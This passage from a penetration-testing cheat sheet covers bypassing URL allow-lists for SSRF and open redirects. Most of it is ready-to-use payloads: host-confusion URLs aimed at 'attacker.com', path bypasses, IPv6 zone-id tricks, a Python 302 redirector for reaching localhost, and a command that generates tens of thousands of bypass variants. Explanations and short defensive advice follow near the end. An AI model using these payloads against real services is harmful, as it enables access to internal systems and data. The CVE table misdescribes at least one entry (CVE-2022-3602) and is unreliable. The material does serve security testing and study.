### Domain Confusion

```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

#Parameter pollution
next={domain}&next=attacker.com
```

### Paths and Extensions Bypass

If you are required that the URL must end in a path or an extension, or must contain a path you can try one of the following bypasses:

```
https://metadata/vulerable/path#/expected/path
https://metadata/vulerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```

### Fuzzing

The tool [**recollapse**](https://github.com/0xacb/recollapse) can generate variations from a given input to try to bypass the used regex. Check [**this post**](https://0xacb.com/2022/11/21/recollapse/) also for more information.

### Automatic Custom Wordlists

Check out the [**URL validation bypass cheat sheet** webapp](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet) from portswigger were you can introduce the allowed host and the attackers one and it'll generate a list of URLs to try for you. It also considers if you can use the URL in a parameter, in a Host header or in a CORS header.

### Bypass via redirect

It might be possible that the server is **filtering the original request** of a SSRF **but not** a possible **redirect** response to that request.\
For example, a server vulnerable to SSRF via: `url=https://www.google.com/` might be **filtering the url param**. But if you uses a [python server to respond with a 302](https://pastebin.com/raw/ywAUhFrv) to the place where you want to redirect, you might be able to **access filtered IP addresses** like 127.0.0.1 or even filtered **protocols** like gopher.\
[Check out this report.](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)

```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("Usage: {} <port_number> <url>".format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(302)
       self.send_header('Location', sys.argv[2])
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

## Explained Tricks

### Blackslash-trick

The _backslash-trick_ exploits a difference between the [WHATWG URL Standard](https://url.spec.whatwg.org/#url-parsing) and [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B). While RFC3986 is a general framework for URIs, WHATWG is specific to web URLs and is adopted by modern browsers. The key distinction lies in the WHATWG standard's recognition of the backslash (`\`) as equivalent to the forward slash (`/`), impacting how URLs are parsed, specifically marking the transition from the hostname to the path in a URL.

### Left square bracket

The “left square bracket” character `[` in the userinfo segment can cause Spring’s UriComponentsBuilder to return a hostname value that differs from browsers: [https://example.com\[@attacker.com](https://portswigger.net/url-cheat-sheet#id=1da2f627d702248b9e61cc23912d2c729e52f878)

### Other Confusions

![https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](<../../images/image (600).png>)

image from [https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)

### IPv6 Zone Identifier (%25) Trick

Modern URL parsers that support RFC 6874 allow *link-local* IPv6 addresses to include a **zone identifier** after a percent sign. Some security filters are not aware of this syntax and will only strip square-bracketed IPv6 literals, letting the following payload reach an internal interface:

```text
http://[fe80::1%25eth0]/          # %25 = encoded '%', interpreted as fe80::1%eth0
http://[fe80::a9ff:fe00:1%25en0]/ # Another example (macOS style)
```

If the target application validates that the host is *not* `fe80::1` but stops parsing at the `%`, it may incorrectly treat the request as external. Always normalise the address **before** any security decision or strip the optional zone id entirely.

### Recent Library Parsing CVEs (2022–2025)

A number of mainstream frameworks have suffered from hostname-mismatch issues that can be exploited for SSRF once URL validation has been bypassed with the tricks listed above:

| Year | CVE | Component | Bug synopsis | Minimal PoC |
|------|-----|-----------|--------------|-------------|
| 2024 | CVE-2024-22243 / ‑22262 | Spring `UriComponentsBuilder` | `[` is not allowed in the *userinfo* section, so `https://example.com\[@internal` is parsed as host `example.com` by Spring but as `internal` by browsers, enabling open-redirect & SSRF when host allow-lists are used. Upgrade to Spring 5.3.34 / 6.0.19 / 6.1.6+.  |
| 2023 | CVE-2023-27592 | **urllib3** <1.26.15 | Backslash confusion allowed `http://example.com\\@169.254.169.254/` to bypass host filters that split on `@`. |
| 2022 | CVE-2022-3602 | OpenSSL | Hostname verification skipped when the name is suffixed with a `.` (dotless domain confusion). |

When you depend on third-party URL parsers, **compare the canonicalised host returned by the library you trust with the raw string supplied by the user** to detect these classes of issues.

### Payload-generation helpers (2024+)

Creating large custom word-lists by hand is cumbersome.  The open-source tool **SSRF-PayloadMaker** (Python 3) can now generate *80 k+* host-mangling combinations automatically, including mixed encodings, forced-HTTP downgrade and backslash variants:

```bash
# Generate every known bypass that transforms the allowed host example.com to attacker.com
python3 ssrf_maker.py --allowed example.com --attacker attacker.com -A -o payloads.txt
```

The resulting list can be fed directly into Burp Intruder or `ffuf`.
